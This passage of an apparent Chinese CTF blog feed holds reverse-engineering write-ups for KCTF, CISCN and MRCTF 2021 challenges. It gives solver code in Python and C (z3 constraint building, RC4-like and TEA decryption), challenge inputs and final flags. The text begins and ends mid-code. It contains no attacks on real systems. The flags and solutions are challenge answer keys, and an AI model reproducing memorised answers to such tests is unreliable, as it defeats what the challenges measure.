class="keyword">and</span> rightcount != <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">if</span> leftcount == rightcount:</span><br><span class="line">                        right = index</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                index += <span class="number">1</span></span><br><span class="line">        rightcount = <span class="number">0</span></span><br><span class="line">        leftcount  = <span class="number">0</span></span><br><span class="line">        index = ind</span><br><span class="line">        <span class="keyword">if</span> string[ind<span class="number">-2</span>] != <span class="string">')'</span>:</span><br><span class="line">            left = string[:ind].rfind(<span class="string">'a'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> string[ind::<span class="number">-1</span>]:</span><br><span class="line">                <span class="keyword">if</span> i == <span class="string">'('</span>:</span><br><span class="line">                    leftcount  += <span class="number">1</span></span><br><span class="line">                <span class="keyword">elif</span> i == <span class="string">')'</span>:</span><br><span class="line">                    rightcount += <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> leftcount != <span class="number">0</span> <span class="keyword">and</span> rightcount != <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">if</span> leftcount == rightcount:</span><br><span class="line">                        left = index</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                index -= <span class="number">1</span></span><br><span class="line">        <span class="comment">#(a ^ 1) &amp; (b &amp; 1)    &lt;</span></span><br><span class="line">        <span class="comment">#~((a ^ 1) &amp; (b &amp; 1)) &gt;=</span></span><br><span class="line">        <span class="keyword">if</span> fed == <span class="string">'&lt;'</span>:</span><br><span class="line">            a=string[left:ind<span class="number">-1</span>]</span><br><span class="line">            b=string[ind+<span class="number">2</span>:right+<span class="number">1</span>]</span><br><span class="line">            <span class="comment">#print(a+" &lt; "+b)</span></span><br><span class="line">            <span class="comment">#print("(" + a + " ^ 1) &amp; (" + b + " &amp; 1)")</span></span><br><span class="line">            <span class="comment">#os.system('pause')</span></span><br><span class="line">            string = string.replace(a+<span class="string">" &lt; "</span>+b, <span class="string">"("</span> + a + <span class="string">"^1)&amp;("</span> + b + <span class="string">"&amp;1)"</span>)</span><br><span class="line">        <span class="keyword">elif</span> fed == <span class="string">'&gt;='</span>:</span><br><span class="line">            a=string[left:ind<span class="number">-1</span>]</span><br><span class="line">            b=string[ind+<span class="number">3</span>:right+<span class="number">1</span>]</span><br><span class="line">            <span class="comment">#print(a+" &gt;= "+b)</span></span><br><span class="line">            <span class="comment">#print("((~((" + a + "^1)&amp;(" + b + "&amp;1)))&amp;1)")</span></span><br><span class="line">            <span class="comment">#os.system('pause')</span></span><br><span class="line">            string = string.replace(a+<span class="string">" &gt;= "</span>+b, <span class="string">"((~(("</span> + a + <span class="string">"^1)&amp;("</span> + b + <span class="string">"&amp;1)))&amp;1)"</span>)</span><br><span class="line">    <span class="keyword">return</span> string</span><br><span class="line"></span><br><span class="line">file = open(<span class="string">"./kctf10/decompile.txt"</span>,encoding=<span class="string">"utf8"</span>)</span><br><span class="line">key = <span class="string">"a1"</span></span><br><span class="line">sb = <span class="string">''</span></span><br><span class="line">line_num = <span class="number">0</span></span><br><span class="line">maxline = <span class="number">0</span></span><br><span class="line">line = file.readlines()</span><br><span class="line">sbb = []</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    line_num += <span class="number">1</span></span><br><span class="line">    maxline = max(maxline,line_num)</span><br><span class="line">    <span class="keyword">if</span> line_num &lt;= len(line):</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">in</span> line[line_num]:</span><br><span class="line">            <span class="keyword">while</span> <span class="string">'v3'</span> <span class="keyword">not</span> <span class="keyword">in</span> line[line_num]:</span><br><span class="line">                sb += line[line_num].split(<span class="string">' = '</span>)[<span class="number">1</span>][:<span class="number">-5</span>] + <span class="string">'('</span></span><br><span class="line">                line_num -= <span class="number">1</span></span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">            sb += line[line_num].split(<span class="string">' = '</span>)[<span class="number">1</span>][:<span class="number">-5</span>] + <span class="string">'('</span></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            line_num -= <span class="number">1</span></span><br><span class="line">            sb += line[line_num].split(<span class="string">' = '</span>)[<span class="number">1</span>][:<span class="number">-2</span>]</span><br><span class="line">            <span class="keyword">while</span> i != <span class="number">0</span>:</span><br><span class="line">                sb += <span class="string">')'</span></span><br><span class="line">                i -= <span class="number">1</span></span><br><span class="line">            maxline += <span class="number">1</span></span><br><span class="line">            line_num = maxline</span><br><span class="line">            sb+=<span class="string">'\n'</span></span><br><span class="line">            sbb.append(sb)</span><br><span class="line">            sb = <span class="string">''</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">file.close()</span><br><span class="line"><span class="comment">#for i in range(len(sbb)):</span></span><br><span class="line"><span class="comment">#    print('printf("%%s",inn[%d]==('%i + sbb[i][:-1] + ')?"set\\n":"unset\\n");')</span></span><br><span class="line"><span class="comment">#i = 2</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(sbb)):</span><br><span class="line"><span class="comment">#if True:</span></span><br><span class="line">    end = FAR(sbb[i],<span class="string">'&lt;'</span>)</span><br><span class="line">    end = FAR(end,<span class="string">'&gt;='</span>)</span><br><span class="line">    <span class="comment">#print(end)</span></span><br><span class="line">    <span class="comment">#print('printf("%%s",inn[%d]==('%i + end[:-1] + ')?"set\\n":"unset\\n");')</span></span><br><span class="line">    end = (<span class="string">'    s.add(inn[%d] == ('</span>%i) + end[:<span class="number">-1</span>] + <span class="string">'))'</span></span><br><span class="line">    print(end)</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      <comments>https://usher2008.github.io/2021/06/01/KCTF%202021%20%E6%98%A5%E5%AD%A3%E8%B5%9B/#disqus_thread</comments>
    </item>
    
    <item>
      <title>国赛2021</title>
      <link>https://usher2008.github.io/2021/05/16/%E5%9B%BD%E8%B5%9B2021/</link>
      <guid>https://usher2008.github.io/2021/05/16/%E5%9B%BD%E8%B5%9B2021/</guid>
      <pubDate>Sat, 15 May 2021 21:32:31 GMT</pubDate>
      <description>
      
        &lt;blockquote&gt;
👴是废物,只做了两个简单题,也没抢到血
      
      </description>
      
      
      <content:encoded><![CDATA[<blockquote>👴是废物,只做了两个简单题,也没抢到血<a id="more"></a></blockquote><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="glass"><a href="#glass" class="headerlink" title="glass"></a>glass</h3><p><img src="http://inews.gtimg.com/newsapp_ls/0/13530717415/0" alt=""></p><p>apk 丢进 jadx 里可以知道关键逻辑在 so 层</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13530717472/0" alt=""></p><p>简单梳理可以得到逻辑概况</p><p>init 不需要知道具体实现细节, dump 出 secreat 即可</p><p>xor1 中 input 与 secreat 进行某种异或操作</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13530717474/0" alt=""></p><p>xor2 中也是异或,不过分成了两段异或,前一段是 input 每3位进行一些异或,再每一位异或 secreat</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13530717477/0" alt=""></p><p>最后再与cmp比较</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13530717480/0" alt=""></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"defs.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> key[]=<span class="string">"12345678"</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xor2</span><span class="params">(_BYTE * result, <span class="keyword">int</span> a2, <span class="keyword">char</span>* a3, <span class="keyword">int</span> a4)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xor1</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>* result, _BYTE *a2, <span class="keyword">int</span> a3)</span></span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> v7[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">101</span>,  <span class="number">94</span>, <span class="number">153</span>, <span class="number">117</span>,  <span class="number">55</span>,  <span class="number">68</span>, <span class="number">129</span>, <span class="number">192</span>, <span class="number">120</span>, <span class="number">163</span>, </span><br><span class="line">  <span class="number">244</span>, <span class="number">167</span>, <span class="number">131</span>, <span class="number">106</span>, <span class="number">133</span>, <span class="number">187</span>, <span class="number">252</span>,  <span class="number">63</span>, <span class="number">137</span>, <span class="number">127</span>, </span><br><span class="line">   <span class="number">20</span>, <span class="number">226</span>,  <span class="number">54</span>, <span class="number">196</span>,   <span class="number">5</span>,  <span class="number">97</span>, <span class="number">220</span>,  <span class="number">43</span>, <span class="number">124</span>, <span class="number">103</span>, </span><br><span class="line">  <span class="number">221</span>,  <span class="number">33</span>, <span class="number">218</span>, <span class="number">123</span>, <span class="number">104</span>,  <span class="number">19</span>,  <span class="number">40</span>,  <span class="number">60</span>,  <span class="number">67</span>, <span class="number">112</span>, </span><br><span class="line">  <span class="number">157</span>, <span class="number">233</span>,  <span class="number">70</span>, <span class="number">232</span>, <span class="number">136</span>,  <span class="number">83</span>, <span class="number">138</span>, <span class="number">219</span>,   <span class="number">1</span>, <span class="number">150</span>, </span><br><span class="line">  <span class="number">201</span>,  <span class="number">90</span>, <span class="number">239</span>, <span class="number">142</span>, <span class="number">212</span>, <span class="number">200</span>, <span class="number">109</span>, <span class="number">216</span>,  <span class="number">56</span>, <span class="number">180</span>, </span><br><span class="line">   <span class="number">78</span>, <span class="number">189</span>,  <span class="number">52</span>,  <span class="number">86</span>, <span class="number">199</span>, <span class="number">213</span>, <span class="number">175</span>, <span class="number">178</span>,  <span class="number">80</span>, <span class="number">227</span>, </span><br><span class="line">   <span class="number">48</span>,  <span class="number">88</span>, <span class="number">121</span>,  <span class="number">11</span>, <span class="number">188</span>,  <span class="number">84</span>,  <span class="number">82</span>,  <span class="number">73</span>, <span class="number">145</span>,  <span class="number">71</span>, </span><br><span class="line">   <span class="number">42</span>, <span class="number">230</span>,  <span class="number">74</span>,  <span class="number">18</span>,  <span class="number">44</span>, <span class="number">240</span>, <span class="number">208</span>,  <span class="number">46</span>, <span class="number">110</span>,  <span class="number">15</span>, </span><br><span class="line">   <span class="number">98</span>, <span class="number">194</span>, <span class="number">179</span>, <span class="number">222</span>, <span class="number">177</span>,  <span class="number">31</span>,  <span class="number">64</span>, <span class="number">228</span>,  <span class="number">57</span>, <span class="number">139</span>, </span><br><span class="line">  <span class="number">115</span>,  <span class="number">99</span>, <span class="number">126</span>, <span class="number">207</span>, <span class="number">128</span>, <span class="number">224</span>, <span class="number">173</span>, <span class="number">141</span>, <span class="number">237</span>,  <span class="number">45</span>, </span><br><span class="line">  <span class="number">223</span>, <span class="number">114</span>,  <span class="number">53</span>, <span class="number">202</span>, <span class="number">134</span>, <span class="number">135</span>, <span class="number">195</span>,  <span class="number">25</span>, <span class="number">176</span>, <span class="number">158</span>, </span><br><span class="line">  <span class="number">249</span>, <span class="number">119</span>, <span class="number">236</span>, <span class="number">250</span>, <span class="number">118</span>,  <span class="number">10</span>,  <span class="number">49</span>,  <span class="number">77</span>, <span class="number">205</span>, <span class="number">160</span>, </span><br><span class="line">  <span class="number">231</span>, <span class="number">247</span>, <span class="number">211</span>, <span class="number">206</span>,  <span class="number">59</span>,   <span class="number">0</span>, <span class="number">246</span>,  <span class="number">85</span>, <span class="number">164</span>, <span class="number">215</span>, </span><br><span class="line">   <span class="number">36</span>, <span class="number">197</span>, <span class="number">140</span>,  <span class="number">13</span>, <span class="number">169</span>,   <span class="number">8</span>,  <span class="number">87</span>, <span class="number">116</span>,  <span class="number">72</span>, <span class="number">186</span>, </span><br><span class="line">  <span class="number">241</span>,  <span class="number">21</span>, <span class="number">190</span>, <span class="number">165</span>,  <span class="number">17</span>, <span class="number">184</span>,  <span class="number">29</span>, <span class="number">162</span>,   <span class="number">3</span>, <span class="number">148</span>, </span><br><span class="line">  <span class="number">147</span>, <span class="number">209</span>,  <span class="number">39</span>, <span class="number">255</span>, <span class="number">146</span>, <span class="number">174</span>, <span class="number">210</span>,  <span class="number">26</span>, <span class="number">181</span>,  <span class="number">27</span>, </span><br><span class="line">   <span class="number">65</span>,  <span class="number">22</span>, <span class="number">242</span>, <span class="number">185</span>, <span class="number">111</span>,  <span class="number">61</span>, <span class="number">193</span>,  <span class="number">24</span>,  <span class="number">93</span>,  <span class="number">91</span>, </span><br><span class="line">   <span class="number">35</span>, <span class="number">198</span>,  <span class="number">14</span>, <span class="number">217</span>, <span class="number">107</span>, <span class="number">156</span>, <span class="number">172</span>, <span class="number">166</span>,  <span class="number">51</span>, <span class="number">151</span>, </span><br><span class="line">  <span class="number">155</span>, <span class="number">245</span>, <span class="number">152</span>,  <span class="number">37</span>, <span class="number">254</span>,  <span class="number">30</span>, <span class="number">251</span>,  <span class="number">75</span>, <span class="number">122</span>,   <span class="number">4</span>, </span><br><span class="line">    <span class="number">9</span>,  <span class="number">23</span>,  <span class="number">38</span>,  <span class="number">81</span>, <span class="number">225</span>, <span class="number">182</span>, <span class="number">113</span>, <span class="number">238</span>,   <span class="number">7</span>,  <span class="number">34</span>, </span><br><span class="line">  <span class="number">253</span>, <span class="number">243</span>, <span class="number">144</span>,  <span class="number">69</span>,  <span class="number">41</span>, <span class="number">248</span>,   <span class="number">2</span>, <span class="number">203</span>, <span class="number">204</span>, <span class="number">154</span>, </span><br><span class="line">  <span class="number">171</span>,  <span class="number">79</span>, <span class="number">214</span>, <span class="number">161</span>,  <span class="number">96</span>,  <span class="number">50</span>,  <span class="number">95</span>, <span class="number">168</span>, <span class="number">143</span>,  <span class="number">76</span>, </span><br><span class="line">  <span class="number">105</span>, <span class="number">132</span>, <span class="number">149</span>,   <span class="number">6</span>, <span class="number">235</span>,  <span class="number">47</span>, <span class="number">183</span>,  <span class="number">32</span>,  <span class="number">62</span>, <span class="number">229</span>, </span><br><span class="line">  <span class="number">130</span>, <span class="number">191</span>,  <span class="number">12</span>,  <span class="number">89</span>,  <span class="number">16</span>, <span class="number">100</span>,  <span class="number">92</span>,  <span class="number">58</span>, <span class="number">125</span>, <span class="number">159</span>, </span><br><span class="line">   <span class="number">28</span>, <span class="number">102</span>, <span class="number">108</span>, <span class="number">170</span>,  <span class="number">66</span>, <span class="number">234</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> cmp[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0xA3</span>, <span class="number">0x1A</span>, <span class="number">0xE3</span>, <span class="number">0x69</span>, <span class="number">0x2F</span>, <span class="number">0xBB</span>, <span class="number">0x1A</span>, <span class="number">0x84</span>, <span class="number">0x65</span>, <span class="number">0xC2</span>, </span><br><span class="line">  <span class="number">0xAD</span>, <span class="number">0xAD</span>, <span class="number">0x9E</span>, <span class="number">0x96</span>, <span class="number">0x05</span>, <span class="number">0x02</span>, <span class="number">0x1F</span>, <span class="number">0x8E</span>, <span class="number">0x36</span>, <span class="number">0x4F</span>, </span><br><span class="line">  <span class="number">0xE1</span>, <span class="number">0xEB</span>, <span class="number">0xAF</span>, <span class="number">0xF0</span>, <span class="number">0xEA</span>, <span class="number">0xC4</span>, <span class="number">0xA8</span>, <span class="number">0x2D</span>, <span class="number">0x42</span>, <span class="number">0xC7</span>, </span><br><span class="line">  <span class="number">0x6E</span>, <span class="number">0x3F</span>, <span class="number">0xB0</span>, <span class="number">0xD3</span>, <span class="number">0xCC</span>, <span class="number">0x78</span>, <span class="number">0xF9</span>, <span class="number">0x98</span>, <span class="number">0x3F</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">xor2(cmp, <span class="number">39</span>, key, <span class="number">8</span>);</span><br><span class="line">    xor1(v7, cmp, <span class="number">39</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>,cmp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>  <span class="title">xor1</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>* v7, _BYTE *input, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// r3</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// r4</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// r5</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( a3 )</span><br><span class="line">  &#123;</span><br><span class="line">    --a3;</span><br><span class="line">    v4 = (v4 + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">    v5 = *(<span class="keyword">unsigned</span> __int8 *)(v7 + v4);</span><br><span class="line">    v3 = (v3 + v5) % <span class="number">256</span>;</span><br><span class="line">    *(_BYTE *)(v7 + v4) = *(_BYTE *)(v7 + v3);</span><br><span class="line">    *(_BYTE *)(v7 + v3) = v5;</span><br><span class="line">    *input++ ^= *(_BYTE *)(v7 + (<span class="keyword">unsigned</span> __int8)(v5 + *(_BYTE *)(v7 + v4)));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xor2</span><span class="params">(_BYTE * input, <span class="keyword">int</span> a2, <span class="keyword">char</span>* key, <span class="keyword">int</span> a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// r4</span></span><br><span class="line">  _BYTE* v5; <span class="comment">// r6</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// r5</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// lr</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// lr</span></span><br><span class="line">  <span class="keyword">int</span> k; <span class="comment">// r6</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">39</span>; j += <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">0</span>; (<span class="number">8</span> &amp; ~(<span class="number">8</span> &gt;&gt; <span class="number">31</span>)) != k &amp;&amp; j + k &lt; <span class="number">39</span>; ++k )</span><br><span class="line">      input[k+j] ^= key[k];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">39</span>; i += <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    input[i]    =input[i]           ^input[i+2]</span></span><br><span class="line"><span class="comment">//    input[i+1]  =input[i]^input[i+1]^input[i+2];</span></span><br><span class="line"><span class="comment">//    input[i+2]  =         input[i+1]^input[i+2]</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> b=input[i]^input[i+<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> a=input[i+<span class="number">1</span>]^input[i+<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> c=input[i]^input[i+<span class="number">2</span>]^input[i+<span class="number">1</span>];</span><br><span class="line">    input[i]=a;</span><br><span class="line">    input[i+<span class="number">1</span>]=b;</span><br><span class="line">    input[i+<span class="number">2</span>]=c;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13530717483/0" alt=""></p><p>测试截图</p><img src="http://inews.gtimg.com/newsapp_ls/0/13530717486/0" style="zoom:50%;" /><p>所以最终结果为</p><blockquote><p>CISCN{6654d84617f627c88846c172e0f4d46c}</p></blockquote><h3 id="baby-bc"><a href="#baby-bc" class="headerlink" title="baby bc"></a>baby bc</h3><p>百度可知 bc 是 LLVM bitcode 文件</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13530717494/0" alt=""></p><p>所以执行下行代码可以得到可执行文件</p><blockquote><p>clang -o baby baby.bc</p></blockquote><p>将编译完的文件丢进 IDA 可以看见清晰的逻辑层次</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13530717505/0" alt=""></p><p>细细分析以下,可以知道输入长度为25 输入限制为0-5</p><p>在 fill_numbner 中,经过输入测试,得知</p><p>输入用作填充 map ,如果在原来的 map 非 0 的地方填充非 0 ,则填充失败,这是第一个条件</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13530717510/0" alt=""></p><p>在 docheck 中  还有四个条件</p><p>第一个是 map 中每一横排两两不重复</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13530717517/0" alt=""></p><p>第二个是 map 中每一竖列两两不重复</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13530717521/0" alt=""></p><p>第三个条件是按照 row 索引表 为1的地方要大于它右边的那一位 2则小于</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13530717526/0" alt=""></p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13530717530/0" alt=""></p><p>第四个条件是按照 col 索引表 为1的地方要小于它下边的那一位 2则大于</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13530717533/0" alt=""></p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13530717536/0" alt=""></p><p>综合以上条件</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13530717542/0" alt=""></p><p>为所求幻方</p><p>所以输入为</p><p>1425353142350212150442315</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13530717547/0" alt=""></p><p>验证正确</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13530717552/0" alt=""></p><p>所以</p><blockquote><p>CISCN{8a04b4597ad08b83211d3adfa1f61431}</p></blockquote><p>为所求</p>]]></content:encoded>
      
      <comments>https://usher2008.github.io/2021/05/16/%E5%9B%BD%E8%B5%9B2021/#disqus_thread</comments>
    </item>
    
    <item>
      <title>MRCTF 2021</title>
      <link>https://usher2008.github.io/2021/04/11/MRCTF%202021/</link>
      <guid>https://usher2008.github.io/2021/04/11/MRCTF%202021/</guid>
      <pubDate>Sun, 11 Apr 2021 15:26:39 GMT</pubDate>
      <description>
      
        &lt;h2 id=&quot;MRCTF-2021&quot;&gt;&lt;a href=&quot;#MRCTF-2021&quot; class=&quot;headerlink&quot; title=&quot;MRCTF 2021&quot;&gt;&lt;/a&gt;MRCTF 2021&lt;/h2&gt;&lt;blockquote&gt;
谭总:这波是re带飞
      
      </description>
      
      
      <content:encoded><![CDATA[<h2 id="MRCTF-2021"><a href="#MRCTF-2021" class="headerlink" title="MRCTF 2021"></a>MRCTF 2021</h2><blockquote>谭总:这波是re带飞<a id="more"></a></blockquote><h3 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h3><h4 id="real-signIn"><a href="#real-signIn" class="headerlink" title="real_signIn"></a>real_signIn</h4><p>cmp</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13399130730/0" alt=""></p><p>换的表</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13399130766/0" alt=""></p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13399130785/0" alt=""></p><blockquote><p>MRCTF{wElc0Me_t0_MRCTF_2o21!!!}</p></blockquote><h4 id="dynamic-debug"><a href="#dynamic-debug" class="headerlink" title="dynamic_debug"></a>dynamic_debug</h4><p>main 很简单</p><p>里面的 check 看到了其他的引用 在引用处还有异或</p><p>遂动调至此处 果然其代码被更改</p><p>去掉一些垃圾指令以后 创建函数就可以F5了</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13399130814/0" alt=""></p><p>随便分析一下就知道是 tea 了</p><p>直接把他代码复制粘贴反着写一遍输出就完事了</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13399130839/0" alt=""></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> det 0x9E3779B9</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> cmp[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x99</span>, <span class="number">0xA1</span>, <span class="number">0x85</span>, <span class="number">0x55</span>, <span class="number">0x68</span>, <span class="number">0x5D</span>, <span class="number">0x82</span>, <span class="number">0x7E</span>, <span class="number">0x39</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x4D</span>, <span class="number">0x94</span>, <span class="number">0x43</span>, <span class="number">0x69</span>, <span class="number">0x72</span>, <span class="number">0x71</span>, <span class="number">0x06</span>, <span class="number">0x43</span>, <span class="number">0x51</span>, <span class="number">0x6A</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xAD</span>, <span class="number">0x14</span>, <span class="number">0x4B</span>, <span class="number">0x3F</span>, <span class="number">0x0D</span>, <span class="number">0xD2</span>, <span class="number">0x64</span>, <span class="number">0x15</span>, <span class="number">0xDB</span>, </span><br><span class="line">  <span class="number">0x37</span>, <span class="number">0x9F</span>, </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> key[]=<span class="string">"cdbgnamie_dyilik"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i+=<span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> sum=det*<span class="number">32</span>;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> a=((<span class="keyword">unsigned</span> <span class="keyword">int</span>*)cmp)[i],b=((<span class="keyword">unsigned</span> <span class="keyword">int</span>*)cmp)[i+<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span 